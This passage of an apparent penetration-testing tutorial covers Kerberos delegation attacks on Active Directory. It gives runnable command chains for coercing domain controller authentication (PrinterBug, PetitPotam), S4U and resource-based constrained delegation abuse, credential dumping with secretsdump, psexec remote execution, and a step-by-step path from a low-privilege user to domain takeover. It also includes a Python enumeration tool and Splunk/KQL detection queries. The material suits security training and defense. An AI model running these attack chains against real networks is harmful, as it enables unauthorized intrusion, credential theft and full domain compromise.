Force DC01 to authenticate to the unconstrained delegation server, then capture DC01's TGT.

```bash
# Linux (printerbug.py — impacket-based)
python3 printerbug.py corp.local/lowpriv:Password123@DC01.corp.local \
    UNCONSTRAINED_SERVER.corp.local

# Windows (SpoolSample.exe)
SpoolSample.exe DC01.corp.local UNCONSTRAINED_SERVER.corp.local

# Simultaneously run Rubeus monitor on the unconstrained delegation server
Rubeus.exe monitor /interval:3 /filteruser:DC01$ /nowrap
```

PrinterBug abuses the RPC functionality of the Windows Spooler service to force DC01 to perform NTLM authentication against the attacker's server.

### Forcing Authentication with PetitPotam (EFSRPC)

```bash
# Alternative when PrinterBug has been patched
python3 PetitPotam.py -u lowpriv -p Password123 \
    UNCONSTRAINED_SERVER.corp.local DC01.corp.local

# Can be combined with NTLM Relay to steal DC certificates (AD CS environments)
python3 ntlmrelayx.py -t http://CA.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController
```

### Detection

```
Event ID 4769: Kerberos Service Ticket Request
  → Anomaly: TGS request for DC machine account (DC01$) originating from an internal server
  → Check for the forwardable (0x40000000) flag in Ticket Options

Event ID 4624 Type 3: Network Logon
  → Repeated DC authentication to the unconstrained delegation server
```

---

## 4. Constrained Delegation Attack

### How It Works: S4U Extension

```
S4U2Self:  Service requests a service ticket for itself on behalf of any user
S4U2Proxy: Uses the ticket from S4U2Self to perform a delegated request to an allowed service

Attack prerequisites:
  - Hash or TGT of an account with TrustedToAuthForDelegation=True
  - List of allowed SPNs in msDS-AllowedToDelegateTo

Attack outcome:
  - Can authenticate as any user (including Administrator) to the allowed services
```

### Enumeration and Target Identification

```powershell
# Detailed information on constrained delegation service accounts
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties msDS-AllowedToDelegateTo, userAccountControl |
    ForEach-Object {
        Write-Host "Account: $($_.SamAccountName)"
        Write-Host "Allowed SPNs: $($_.msDS-AllowedToDelegateTo)"
        Write-Host "Protocol Transition: $(($_.userAccountControl -band 0x1000000) -ne 0)"
        Write-Host "---"
    }
```

### Attack Execution: Rubeus S4U

```powershell
# Method 1: Using the service account's password hash (obtained via Kerberoasting, etc.)
Rubeus.exe s4u /user:svc_iis `
    /rc4:NTLM_HASH_HERE `
    /impersonateuser:Administrator `
    /msdsspn:"cifs/fileserver.corp.local" `
    /nowrap

# Method 2: S4U + alterservice (convert ticket to a different SPN)
# Allowed SPN: http/webserver → convert to cifs/webserver
Rubeus.exe s4u /user:svc_iis `
    /rc4:NTLM_HASH `
    /impersonateuser:Administrator `
    /msdsspn:"http/webserver.corp.local" `
    /altservice:"cifs/webserver.corp.local,host/webserver.corp.local" `
    /nowrap

# Inject the obtained TGS into memory
Rubeus.exe ptt /ticket:<base64_TGS>

# Verify access
dir \\fileserver.corp.local\C$
```

Rubeus s4u issues an Administrator-privileged service ticket using only the service account's hash. The alterservice option converts the allowed SPN to target a different service.

### Same Attack with impacket (Linux)

```bash
# Obtain a service ticket with getST.py
getST.py -spn 'cifs/fileserver.corp.local' \
    -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 \
    'corp.local/svc_iis:ServicePassword'

# Use the obtained ccache file
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass fileserver.corp.local

# DCSync (if a Domain Admin TGS was obtained)
secretsdump.py -k -no-pass corp.local
```

---

## 5. Resource-Based Constrained Delegation (RBCD) Attack

### How It Works

```
Traditional constrained delegation: The KDC grants delegation rights to the service
RBCD:                               The resource (target) itself specifies its own allowed list

Prerequisites:
  - GenericAll/GenericWrite/WriteProperty permission on the target computer object
  - OR the default ms-DS-MachineAccountQuota value (default: 10) held by Domain Users
    → Regular users can create up to 10 new computer accounts in the domain

Attack flow:
  1. Create a fake computer account (FAKEMACHINE$)
  2. Add FAKEMACHINE$ to the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity
  3. Obtain an Administrator TGS via S4U2Self + S4U2Proxy
  4. Access the target computer as Administrator
```

### Full Attack Chain (Linux — impacket)

```bash
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Step 1: Check MachineAccountQuota
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(objectClass=domain)" \
    ms-DS-MachineAccountQuota

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Step 2: Create a fake computer account
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
addcomputer.py \
    -computer-name 'FAKEMACHINE$' \
    -computer-pass 'FakePass123!' \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Step 3: Set the RBCD attribute on the target computer
# (lowpriv account must have write permission on the TARGET$ object)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
rbcd.py \
    -delegate-from 'FAKEMACHINE$' \
    -delegate-to 'TARGET$' \
    -action write \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# Verify the setting
rbcd.py \
    -delegate-to 'TARGET$' \
    -action read \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Step 4: Obtain an Administrator TGS via S4U2Self + S4U2Proxy
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
getST.py \
    -spn 'cifs/TARGET.corp.local' \
    -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 \
    'corp.local/FAKEMACHINE$:FakePass123!'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Step 5: Access the target with the obtained TGS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache

# Access via SMB
smbclient.py -k -no-pass TARGET.corp.local

# Dump hashes (with local admin privileges)
secretsdump.py -k -no-pass TARGET.corp.local

# Remote command execution
psexec.py -k -no-pass Administrator@TARGET.corp.local
```

This is the full attack chain: create a fake computer account, set the RBCD attribute, then issue an Administrator service ticket via S4U2Proxy.

### RBCD Attack (Windows — Rubeus + PowerView)

```powershell
# Step 1: Create a fake computer account
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Step 2: Get the SID of the fake computer
$SID = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid

# Step 3: Set the RBCD attribute (using PowerView's Set-DomainObject)
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Step 4: Obtain and inject TGS via S4U
Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<NTLM_hash_of_FakePass123!> `
    /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt

# Verify access
dir \\TARGET.corp.local\C$
```

### GenericWrite → RBCD Path (Common Scenario)

```
Path discoverable in BloodHound:
  lowpriv (User) → [GenericWrite] → WORKSTATION01 (Computer)
  
  Because GenericWrite permission exists on WORKSTATION01,
  the msDS-AllowedToActOnBehalfOfOtherIdentity attribute can be modified
  → RBCD attack to gain local admin on WORKSTATION01
  → Credential harvesting → Move to higher privileges
```

---

## 6. Kerberos Delegation Automation Python Tool

```python
#!/usr/bin/env python3
"""
Automated Kerberos delegation vulnerability enumeration and attack path analysis tool
Uses the ldap3 library to enumerate delegation settings in AD
and automatically suggests exploitable attack paths.
"""

from __future__ import annotations
import argparse
import json
import sys
from dataclasses import dataclass, field, asdict
from typing import Any

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
except ImportError:
    print("[!] ldap3 not installed: pip install ldap3", file=sys.stderr)
    sys.exit(1)


UAC_TRUSTED_FOR_DELEGATION = 0x80000          # Unconstrained delegation
UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000  # Constrained delegation (Protocol Transition)


@dataclass
class DelegationFinding:
    account_name: str
    account_type: str  # "computer" or "user"
    delegation_type: str  # "unconstrained", "constrained", "rbcd"
    allowed_spns: list[str] = field(default_factory=list)
    risk: str = "high"
    attack_path: str = ""


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Automated Kerberos delegation vulnerability enumeration tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10
  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10 -o findings.json
        """,
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    enum_parser = subparsers.add_parser("enum", help="Enumerate delegation settings")
    enum_parser.add_argument("-d", "--domain", required=True, help="Domain name (e.g. corp.local)")
    enum_parser.add_argument("-u", "--username", required=True, help="Username")
    enum_parser.add_argument("-p", "--password", required=True, help="Password")
    enum_parser.add_argument("--dc-ip", required=True, help="DC IP address")
    enum_parser.add_argument(
        "-o", "--output", help="Output JSON file path"
    )
    enum_parser.add_argument(
        "--no-dc", action="store_true",
        help="Exclude Domain Controller accounts from results"
    )

    return parser.parse_args()


def connect_ldap(domain: str, username: str, password: str, dc_ip: str) -> Connection:
    """Connect to the LDAP server."""
    server = Server(dc_ip, get_info=ALL)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )
    return conn


def get_base_dn(domain: str) -> str:
    """Convert a domain name to DN format."""
    return ",".join(f"dc={part}" for part in domain.split("."))


def enumerate_unconstrained(conn: Connection, base_dn: str, exclude_dc: bool) -> list[DelegationFinding]:
    """Enumerate accounts with unconstrained delegation."""
    findings = []

    # UAC flag 524288 = 0x80000 = TRUSTED_FOR_DELEGATION
    conn.search(
        search_base=base_dn,
        search_filter="(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "objectClass", "userAccountControl", "dNSHostName"],
    )

    for entry in conn.entries:
        name = str(entry.sAMAccountName)
        obj_class = [c.lower() for c in entry.objectClass]
        account_type = "computer" if "computer" in obj_class else "user"

        if exclude_dc and name.endswith("$") and "domaincontroller" in [c.lower() for c in obj_class]:
            continue

        findings.append(DelegationFinding(
            account_name=name,
            account_type=account_type,
            delegation_type="unconstrained",
            risk="critical",
            attack_path=(
                f"1. Compromise the {name} server\n"
                f"2. Collect TGTs with Rubeus monitor\n"
                f"3. Force DC TGT collection via SpoolSample/PetitPotam\n"
                f"4. DCSync → Full domain takeover"
            ),
        ))

    return findings


def enumerate_constrained(conn: Connection, base_dn: str) -> list[DelegationFinding]:
    """Enumerate accounts with constrained delegation."""
    findings = []

    conn.search(
        search_base=base_dn,
        search_filter="(msDS-AllowedToDelegateTo=*)",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "objectClass", "msDS-AllowedToDelegateTo", "userAccountControl"],
    )

    for entry in conn.entries:
        name = str(entry.sAMAccountName)
        obj_class = [c.lower() for c in entry.objectClass]
        account_type = "computer" if "computer" in obj_class else "user"
        allowed_spns = [str(s) for s in entry["msDS-AllowedToDelegateTo"]]

        uac = int(entry.userAccountControl) if entry.userAccountControl else 0
        protocol_transition = bool(uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)

        findings.append(DelegationFinding(
            account_name=name,
            account_type=account_type,
            delegation_type="constrained",
            allowed_spns=allowed_spns,
            risk="high",
            attack_path=(
                f"1. Obtain credentials for {name} (via Kerberoasting, etc.)\n"
                f"2. Rubeus s4u /user:{name} /rc4:<hash> "
                f"/impersonateuser:Administrator /msdsspn:{allowed_spns[0] if allowed_spns else 'SPN'}\n"
                f"3. Access the service with the obtained TGS\n"
                f"{'[!] Protocol Transition enabled — can impersonate any user' if protocol_transition else ''}"
            ),
        ))

    return findings


def print_findings(findings: list[DelegationFinding]) -> None:
    """Print discovered delegation vulnerabilities."""
    if not findings:
        print("[+] No delegation vulnerabilities found")
        return

    print(f"\n{'='*60}")
    print(f"  {len(findings)} delegation vulnerabilities found")
    print(f"{'='*60}\n")

    for i, f in enumerate(findings, 1):
        risk_color = "★★★★★" if f.risk == "critical" else "★★★★☆"
        print(f"[{i}] {f.account_name} ({f.account_type})")
        print(f"    Delegation type: {f.delegation_type.upper()}")
        print(f"    Risk:            {risk_color}")
        if f.allowed_spns:
            print(f"    Allowed SPNs: {', '.join(f.allowed_spns[:3])}")
        print(f"    Attack path:")
        for line in f.attack_path.split("\n"):
            if line.strip():
                print(f"      {line}")
        print()


def main() -> None:
    args = parse_args()

    if args.command == "enum":
        print(f"[*] LDAP connection: {args.dc_ip} ({args.domain})")
        try:
            conn = connect_ldap(args.domain, args.username, args.password, args.dc_ip)
        except Exception as e:
            print(f"[!] Connection failed: {e}", file=sys.stderr)
            sys.exit(1)

        base_dn = get_base_dn(args.domain)
        print(f"[*] Search base: {base_dn}\n")

        all_findings: list[DelegationFinding] = []

        print("[*] Enumerating unconstrained delegation...")
        all_findings.extend(enumerate_unconstrained(conn, base_dn, args.no_dc))

        print("[*] Enumerating constrained delegation...")
        all_findings.extend(enumerate_constrained(conn, base_dn))

        print_findings(all_findings)

        if args.output:
            import pathlib
            output_data = [asdict(f) for f in all_findings]
            pathlib.Path(args.output).write_text(
                json.dumps(output_data, indent=2, ensure_ascii=False)
            )
            print(f"[*] Results saved: {args.output}")


if __name__ == "__main__":
    main()
```

This tool queries the AD environment via LDAP to automatically enumerate unconstrained and constrained delegation settings, and suggests concrete attack paths for each vulnerability.

---

## 7. Detection and Defense

### Event ID-Based Detection

| Event ID | Log | Description | Delegation Attack Relevance |
|---------|-----|-------------|----------------------------|
| **4769** | Security | Kerberos Service Ticket Request | Detect S4U requests |
| **4771** | Security | Kerberos Pre-authentication failed | Failed AS-REQ |
| **4624** Type 3 | Security | Network Logon | Access to unconstrained delegation server |
| **5145** | Security | Network Share Access | CIFS/SMB access |
| **4738** | Security | User Account Changed | RBCD attribute modification |
| **4742** | Security | Computer Account Changed | RBCD attribute modification |

### Splunk Detection Queries

```spl
-- Detect S4U2Self requests (forwardable flag in Ticket Options)
index=windows EventCode=4769
| eval ticket_opts=mvindex(split(Ticket_Options, "0x"),1)
| where tonumber(ticket_opts, 16) band 0x40000000 > 0
| where NOT Service_Name IN ("krbtgt", "$")
| stats count, values(Account_Name) by Service_Name, Client_Address
| where count > 5

-- Detect anomalous connections to unconstrained delegation servers
index=windows EventCode=4624 Logon_Type=3
| lookup unconstrained_delegation_servers ComputerName AS host
| where isnotnull(delegation_type)
| stats count by src_ip, host, Account_Name
| where count > 10

-- Detect RBCD attribute modification
index=windows EventCode=4742
| eval msg=coalesce(Message, "")
| where match(msg, "msDS-AllowedToActOnBehalfOfOtherIdentity")
| table _time, host, Subject_Account_Name, Target_Account_Name
```

### Microsoft Sentinel KQL Detection

```kusto
// Detect anomalous S4U Kerberos delegation requests
SecurityEvent
| where EventID == 4769
| extend TicketOptions = tostring(EventData["TicketOptions"])
// Forwardable flag = 0x40000000
| where TicketOptions has "0x40000000"
| where ServiceName !endswith "$" and ServiceName != "krbtgt"
| summarize RequestCount = count(), Accounts = make_set(AccountName)
    by ServiceName, ClientAddress, bin(TimeGenerated, 1h)
| where RequestCount > 20
| extend AlertSeverity = "High"

// Detect RBCD attribute modification
SecurityEvent
| where EventID in (4738, 4742)
| where EventData has "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, SubjectUserName, TargetUserName = AccountName,
          Computer
| extend AlertSeverity = "Critical"
```

### Defensive Countermeasures

```
1. Completely eliminate unconstrained delegation
   → After migrating legacy services, set TrustedForDelegation=False

2. Use the Protected Users group (Windows Server 2012 R2+)
   → Group members cannot be used for Kerberos delegation
   → Add administrator and service accounts to this group

3. Mark accounts as sensitive
   → Check "Account is sensitive and cannot be delegated"
   → Required for privileged accounts such as DA and EA

4. Tiered Administration Model
   Tier 0: DC, PKI, authentication services (isolated)
   Tier 1: Server administration
   Tier 2: Workstation administration

5. Set ms-DS-MachineAccountQuota to 0
   → Block regular users from creating computer accounts
   → Removes the key prerequisite for RBCD attacks

6. Migrate from constrained delegation to RBCD
   → Finer-grained control than constrained delegation
   → Resource owners manage their own allowed list directly
```

---

## 8. Comprehensive Attack Scenario: Low Privilege → Domain Admin

```
Scenario: lowpriv account (regular domain user) → DA acquisition
Estimated time: ~15 minutes (assuming environment is prepared)

─────────────────────────────────────────────────────────
Step 1: Reconnaissance [5 minutes]
─────────────────────────────────────────────────────────
1a. Collect domain data with BloodHound
    bloodhound-python -u lowpriv -p Password123 \
        -d corp.local -dc 192.168.1.10 -c all --zip

1b. Analyze in BloodHound GUI
    → Check "Shortest Paths to Domain Admins"
    → Discover RBCD path: lowpriv → [GenericWrite] → WORKSTATION01

─────────────────────────────────────────────────────────
Step 2: Check MachineAccountQuota [1 minute]
─────────────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u lowpriv -p Password123 \
    --kdcHost 192.168.1.10 -M maq

─────────────────────────────────────────────────────────
Step 3: Execute RBCD attack [5 minutes]
─────────────────────────────────────────────────────────
# Create fake computer account
addcomputer.py -computer-name 'PWNED$' -computer-pass 'Pwned123!' \
    -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'

# Set RBCD attribute
rbcd.py -delegate-from 'PWNED$' -delegate-to 'WORKSTATION01$' \
    -action write -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'

# Issue Administrator TGS
getST.py -spn 'cifs/WORKSTATION01.corp.local' -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 'corp.local/PWNED$:Pwned123!'

─────────────────────────────────────────────────────────
Step 4: Credential harvesting [2 minutes]
─────────────────────────────────────────────────────────
export KRB5CCNAME=Administrator@cifs_WORKSTATION01.corp.local@CORP.LOCAL.ccache
secretsdump.py -k -no-pass WORKSTATION01.corp.local

# If the harvested hashes include a reused DA password → DA acquired
# Or if a Kerberoastable service account is a workstation local admin → pivot

─────────────────────────────────────────────────────────
Step 5: Domain takeover
─────────────────────────────────────────────────────────
# DCSync with DA credentials
secretsdump.py corp.local/Administrator:'DAPassword'@DC01.corp.local
```
